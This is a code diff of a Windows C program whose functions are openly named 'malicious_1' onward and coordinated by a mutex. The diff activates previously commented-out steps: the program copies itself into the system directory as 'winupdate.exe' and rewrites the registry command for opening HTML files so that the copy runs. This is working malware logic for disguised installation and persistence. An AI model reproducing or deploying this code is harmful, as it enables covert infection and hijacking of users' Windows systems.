@@ -55,7 +55,8 @@ void malicious_1()
     if ((1 - order) == 1)
     {
         order = 1;
-        // GetModuleFileName(NULL,MyPath,sizeof(MyPath));
+        GetModuleFileName(NULL, MyPath, sizeof(MyPath));
+        GetSystemDirectory(CpyPath, sizeof(CpyPath));
     }
     ReleaseMutex(hMutex);
 }
@@ -69,7 +70,8 @@ void malicious_2()
     if ((2 - order) == 1)
     {
         order = 2;
-        // GetSystemDirectory(CpyPath,sizeof(CpyPath));
+        strcat(CpyPath, "\\winupdate.exe");
+        CopyFile(MyPath, CpyPath, FALSE);
     }
     ReleaseMutex(hMutex);
 }
@@ -82,7 +84,8 @@ void malicious_3()
     if ((3 - order) == 1)
     {
         order = 3;
-        // strcat(CpyPath,"\\winupdate.exe");
+        strcat(CpyPath, " %1");
+        RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0, KEY_WRITE, &Key32);
     }
     ReleaseMutex(hMutex);
 }
@@ -95,59 +98,8 @@ void malicious_4()
     if ((4 - order) == 1)
     {
         order = 4;
-        // CopyFile(MyPath,CpyPath,FALSE);
-    }
-    ReleaseMutex(hMutex);
-}
-
-void malicious_5()
-{
-    for (int i = 0; i < LOOPS; i++)
-        ;
-    WaitForSingleObject(hMutex, INFINITE);
-    if ((5 - order) == 1)
-    {
-        order = 5;
-        // strcat(CpyPath," %1");
-    }
-    ReleaseMutex(hMutex);
-}
-
-void malicious_6()
-{
-    for (int i = 0; i < LOOPS; i++)
-        ;
-    WaitForSingleObject(hMutex, INFINITE);
-    if ((6 - order) == 1)
-    {
-        order = 6;
-        // RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
-    }
-    ReleaseMutex(hMutex);
-}
-
-void malicious_7()
-{
-    for (int i = 0; i < LOOPS; i++)
-        ;
-    WaitForSingleObject(hMutex, INFINITE);
-    if ((7 - order) == 1)
-    {
-        order = 7;
-        // RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
-    }
-    ReleaseMutex(hMutex);
-}
-
-void malicious_8()
-{
-    for (int i = 0; i < LOOPS; i++)
-        ;
-    WaitForSingleObject(hMutex, INFINITE);
-    if ((8 - order) == 1)
-    {
-        order = 8;
-        // RegCloseKey(Key32);
+        RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
+        RegCloseKey(Key32);
     }
     ReleaseMutex(hMutex);
 }
